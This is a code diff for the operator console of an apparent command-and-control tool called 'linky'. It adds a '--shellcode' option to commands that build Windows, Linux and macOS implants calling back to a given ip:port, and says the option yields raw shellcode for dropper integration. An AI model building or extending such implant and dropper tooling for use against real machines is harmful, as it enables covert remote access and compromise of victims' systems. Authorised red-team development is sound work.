@@ -27,24 +27,27 @@ pub fn run(links: Arc<Mutex<Links>>) {
                     "links" => links_menu(&links, &mut rl),
                     "generate" => {
                         if rest.is_empty() {
-                            ui::print("Usage: generate <ip:port>");
+                            ui::print("Usage: generate <ip:port> [--shellcode]");
                         } else {
-                            crate::generate::generate_windows(rest);
+                            let (callback, shellcode) = parse_generate_args(rest);
+                            crate::generate::generate_windows(&callback, shellcode);
                         }
                     }
                     "generate-linux" => {
                         if rest.is_empty() {
-                            ui::print("Usage: generate-linux <ip:port>");
+                            ui::print("Usage: generate-linux <ip:port> [--shellcode]");
                         } else {
-                            crate::generate::generate_linux(rest);
+                            let (callback, shellcode) = parse_generate_args(rest);
+                            crate::generate::generate_linux(&callback, shellcode);
                         }
                     }
 
                     "generate-osx" => {
                         if rest.is_empty() {
-                            ui::print("Usage: generate-osx <ip:port>");
+                            ui::print("Usage: generate-osx <ip:port> [--shellcode]");
                         } else {
-                            crate::generate::generate_osx(rest);
+                            let (callback, shellcode) = parse_generate_args(rest);
+                            crate::generate::generate_osx(&callback, shellcode);
                         }
                     }
                     "help" => print_help(),
@@ -415,13 +418,29 @@ fn split_first(s: &str) -> (&str, &str) {
     }
 }
 
+/// Parse "10.0.0.1:8443 --shellcode" → ("10.0.0.1:8443", true)
+/// Parse "10.0.0.1:8443"             → ("10.0.0.1:8443", false)
+fn parse_generate_args(args: &str) -> (String, bool) {
+    let parts: Vec<&str> = args.split_whitespace().collect();
+    let shellcode = parts.contains(&"--shellcode");
+    let callback = parts
+        .iter()
+        .find(|p| !p.starts_with("--"))
+        .map(|p| p.to_string())
+        .unwrap_or_default();
+    (callback, shellcode)
+}
+
 fn print_help() {
-    ui::print("  links                    Manage active links");
-    ui::print("  generate <ip:port>       Build Windows implant (x86_64-pc-windows-gnu)");
-    ui::print("  generate-linux <ip:port> Build Linux implant   (x86_64-unknown-linux-musl)");
-    ui::print("  generate-osx <ip:port>   Build macOS implant   (x86_64-apple-darwin)");
-    ui::print("  help                     Show this help");
-    ui::print("  exit / kill              Quit linky");
+    ui::print("  links                              Manage active links");
+    ui::print("  generate <ip:port> [--shellcode]    Build Windows implant");
+    ui::print("  generate-linux <ip:port> [--shellcode]  Build Linux implant");
+    ui::print("  generate-osx <ip:port> [--shellcode]    Build macOS implant");
+    ui::print("  help                               Show this help");
+    ui::print("  exit / kill                        Quit linky");
+    ui::print("");
+    ui::print("  --shellcode : produce minimal .bin for dropper integration");
+    ui::print("                (uses release-shellcode profile, objcopy extraction)");
 }
 
 fn print_link_help() {
